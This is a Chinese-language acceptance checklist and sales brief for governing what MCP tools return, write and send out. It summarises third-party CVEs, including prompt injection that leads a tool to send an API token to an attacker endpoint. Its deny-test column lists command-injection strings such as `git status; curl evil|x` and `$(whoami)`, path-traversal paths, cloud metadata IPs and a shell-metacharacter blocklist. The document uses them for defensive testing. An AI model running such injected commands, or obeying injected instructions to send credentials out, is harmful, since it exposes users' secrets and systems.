# 结果 / 输出面治理 · 12 项验收清单（V1.74 · 2026-11-17）

> **本期判词**：**工具返回给模型的结果，也不是安全边界。**
> 六段式收口：注解（V1.69）→ 注册中心（V1.70）→ 只读声明（V1.71）→ 决策层（V1.72）→ 配置面（V1.73）→ **结果面（V1.74）**。
> 前面五段管「谁能动 / 怎么判」，这一段管**动完之后交出去的东西**：回传字段、写出文件、外发端点、拼接命令。

---

## 0. 为什么这一段现在必须补（本期证据链，11-15~11-17）

| 披露 | 攻击面 | 一句话 |
| --- | --- | --- |
| **REBUILD `CVE-2026-129875`** | 结果字段 + 查询响应 | MCP QueryRecords 工具把 `User.password` 当可过滤字段，低权限用户用 `LK2` 前缀匹配 + count 响应当**盲注 oracle**，逐字符恢复管理员 SHA-256 口令哈希并登录管理员（CWE-202）。**「只读查询」的结果也能泄密。** |
| **AWS `CVE-2026-126816`**（aws-pricing-mcp-server < 1.0.31） | 输出路径 + 声明 | cost report 生成器路径穿越任意文件写；工具被**错误标记 read-only**，MCP 客户端据此自动批准 —— 声明层直接变成放行依据。 |
| **AWS `CVE-2026-126681`**（Timestream for InfluxDB MCP < 0.0.19） | 外发端点 | 不限制连接端点，远程未认证攻击者经 prompt injection 让工具把 **API token 发到攻击者端点**。 |
| **MCP Python SDK `CVE-2026-115563`**（7.5） | 外发端点 | 向不可信 auth 端点泄漏 OAuth 密钥。 |
| **code-review-mcp-server `CVE-2026-68934`**（8.7/CWE-78） | 参数拼接 | `getLocalGitDiff` 等工具把调用者可控的 `folderPath`/`baseBranch` 拼进 `child_process.execSync`，经 `/bin/sh` 跑任意命令。 |
| **IBM ContextForge `CVE-2026-110279`**（8.1，修 1.1.1） | 身份覆盖 | 特制 HTTP header 覆盖网关上游凭据，破坏用户/应用/agent 身份隔离与审计准确性；官方临时缓解=在反代剥离 `X-Upstream-Authorization`。 |

> ⚠️ 以上均为第三方披露，**本框架不受直接影响**；但每一个都是「工具把结果交回去 / 写出去 / 发出去」这一层的问题，是可以现场演示的治理增量。

---

## 1. 12 项结果面验收清单（可直接进标书）

| # | 验收项 | 控制点 / 规则 | 仓库真实文件 | 现场验收方式 |
| --- | --- | --- | --- | --- |
| 1 | 回传字段敏感列拦截 | CP1 `SENSITIVE_FIELD_RETURNED`：字段名归一化后命中敏感 token 即禁止原样回传 | `examples/result-field-guard/McpResultFieldGuard.java` | 提交 `User.password_hash` 字段，必须 DENY；合法 `name/balance/status` 必须 ALLOW |
| 2 | 盲注 oracle 抑制 | CP2 `ORACLE_ENUMERATION_DETECTED`：敏感字段前缀匹配达阈值即判 oracle | 同上 `Probe` + `evaluate` | 对 `password` 前缀探测 12 次 → DENY；对 `customer_name` 探测 50 次 → ALLOW；等值单次查询 → ALLOW |
| 3 | 只读声明不参与授权 | CP6 `READONLY_HINT_NOT_AUTHORITY`：`readOnlyHint=true` 但有副作用即 DENY | 同上 CP6 | 声明只读 + 写文件 / 外发 / shell 三种都必须 DENY；声明只读且无副作用 → ALLOW |
| 4 | 输出路径 confinement | CP3 `OUTPUT_PATH_ESCAPE`：输出必须落在允许根目录内、无 `..` | 同上 CP3 | `/allowed/root/../../etc/passwd`、`C:\Windows\...` → DENY；`/allowed/root/reports/x.csv` → ALLOW |
| 5 | 外发端点 allowlist | CP4 `EGRESS_ENDPOINT_NOT_ALLOWLISTED`：拒绝 IP 字面量 / 云元数据 / 非白名单主机 | 同上 CP4 | `169.254.169.254`、`10.0.0.5`、`evil.example.com` → DENY；白名单域名 → ALLOW |
| 6 | OAuth/API token 不外泄 | CP4 + 字段脱敏：token/secret/credential 类字段永不进审计明文 | 同上 `audit()` + `B03` 断言 | 提交 `access_token=sk-abc` 被拒后，审计中不得出现明文 `sk-abc` |
| 7 | shell 参数元字符拦截 | CP5 `SHELL_METACHAR_IN_PARAM`：`;/&$\`()<>` 等元字符禁止拼接 | 同上 CP5 + `examples/stdio-command-allowlist/` | `git status; curl evil|x`、`$(whoami)`、`\`id\`` → DENY；`git status` → ALLOW |
| 8 | 身份覆盖防护 | 上游凭据由网关指定，禁止请求头覆盖；在反代剥离覆盖头 | `mcp-gateway` + `mcp-auth`（对位 IBM `110279`） | 注入特制 upstream auth header，验证上游身份仍为网关指定值、审计身份不被改写 |
| 9 | 场景化写权限分级 | 只读查询 / 低风险写入 / 高风险动作三档分别验收；关键写操作强制留痕与回滚 | `mcp-governance` + `mcp-audit`（对位用友蓝皮书采购口径） | 同一任务三档各跑一次，高风险动作须人工确认节点 + 失败停止/转人工 + 可回滚 |
| 10 | 协议接入不替代授权 | 验收话术必须显式声明「MCP/OpenAPI/Skill 只是连接手段」 | `docs/enterprise-rfp-checklist.md` + 售前模板 | 审问售前：「只打通 MCP 是否等于完成业务授权？」答否则扣分 |
| 11 | 每次调用的运行时策略 | 策略在**每次工具调用**上执行，不在设计时写完就算 | `examples/gate-orchestration/McpGateChain.java`（AND 短路链） | 运行时动态改 scope，下一次调用必须立即生效、旧审批不继承 |
| 12 | append-only 可归因审计 | 每条决策写明 rule + 字段名白名单 + 值脱敏 + 归因到具名主体和规则 | `McpResultFieldGuard.audit()` + `examples/audit-ropa-export/` | 从一次业务结果反查数据/授权/操作过程，关键记录可对应、明文值不落盘 |

---

## 2. 买方必问 5 问（不合格 / 合格回答对照）

| # | 问题 | ❌ 不合格回答 | ✅ 合格回答 |
| --- | --- | --- | --- |
| 1 | 你们怎么防止 MCP 工具把敏感字段直接回传给模型？ | 「我们的工具都是只读的」 | 「回传字段走归一化敏感 token 拦截 + 盲注 oracle 阈值，可现场跑 43 断言对照；只读声明不进允许分支」 |
| 2 | 工具要写文件 / 连外部端点，怎么防止被 prompt injection 利用？ | 「我们不在 prompt 里写这种指令」 | 「输出路径 confinement + 外发端点 allowlist + IP 字面量/云元数据拒绝，运行在每次调用上、与 prompt 无关」 |
| 3 | 官方 SDK 升级到最新版是不是就安全了？ | 「是，官方会修」 | 「不是。Python SDK `115563` 就是官方洞；规范定义怎么连不定义谁能动，我们在自己的执行路径做确定性门」 |
| 4 | 打补丁后是不是就干净了？ | 「升级即可」 | 「不是。AWS `125926` 官方明确升级不改存量配置、IBM `110279` 修 1.1.1 → 必须存量全量复验 + 举证」 |
| 5 | 银行/券商担责问题怎么解决？ | 「让模型别做危险操作」 | 「机构拥有授权服务器、工具目录、审计轨迹；读写分 scope、prepare→带外确认、记动作不记聊天（Schwab 受控门同构）」 |

---

## 3. 竞品差异化（为什么是我们）

| 竞品 | 定位 | 缺口 |
| --- | --- | --- |
| SnapLogic Discovery Hub（11-17） | 中央 MCP 注册 + 网关治理 + 可观测 | 平台锁定、治理锁在产品内；非 Java 栈，存量 J2EE 权限无法直接复用 |
| IBM ContextForge（Apache-2.0） | 统一 MCP/A2A/REST 网关 + RBAC | Python + PostgreSQL/Redis 重依赖；且 `110178`/`110194`/`110199`/`110279` 连爆 → 网关自身即攻击面 |
| AWS AgentCore / Bedrock Gateway | 云上动态工具发现 + IAM | 绑定 AWS；私有化 / 等保 / 密评场景不可控 |
| Bifrost / Docker MCP Gateway / Kong | Go/平台网关 | 非 Java 栈、无结果面字段级治理 |

> 本框架的差异化不是「又做了一个网关」，而是：**唯一 Java/Spring 开源栈 + 六段式可验收执行门 + 私有化合规工件 + 存量 Java 权限复用**。

---

## 4. 三档报价（公开挂牌价锚，非成交价）

| 档 | 范围 | 对应交付 |
| --- | --- | --- |
| 基础加固 | $15K–30K | 结果面 12 项验收 + 六段式审计 + 现场对照组演示 |
| 生产级 | $80K–220K | 含 RBAC/SSO/token 作用域/动作级 RBAC + 存量复验举证 + 私有化合规工件 |
| 企业网关 | $250K 起 | 多运行时跨签 + 全量治理平台 + SLA + 联合体技术分包 |

---

## 5. 24 / 48 / 72 小时行动清单

| 窗口 | 动作 |
| --- | --- |
| 24h | 把本 12 项清单 + `result-field-guard` 43 断言输出压成 1 页 PDF；回广发采购平台核实 13327 报名截止与材料清单 |
| 48h | 把「六段式 + Schwab 受控门 + 结果面」做成售前一页纸，附 REBUILD/AWS/IBM CVE 对位表 |
| 72h | 找广州本地集成商谈联合体技术分包（本项目 7 项资质全不满足）；核原厂授权 / 金融案例 / 完税 / 本地团队 |

---

## 6. ⚠️ 诚实边界

- 本框架**不受** REBUILD / AWS / IBM / Python SDK / code-review 等第三方 CVE 直接影响；`examples/result-field-guard/` 是独立参考实现，**未接入 21 个主模块**。
- 敏感字段检测是**字段名 token 归一化匹配**，非语义解析：可能误杀同名业务字段，生产须配字段白名单；盲注阈值为演示常量非统计最优；IP 字面量一律拒绝是保守策略；shell 元字符是词法黑名单非解析器。
- `readOnlyHint` 为声明布尔值，非密码学签名。
- 广发四份为预征集 ≠ 采购邀请；本项目无企业主体 / 商业合同 / 中标 / 金融案例 / 等保测评；7 项资质全不满足只能联合体技术分包。
- 全部报价为公开挂牌价**非成交价**；Schwab / SnapLogic / Masttro / Tochka 数据以官方稿为准。
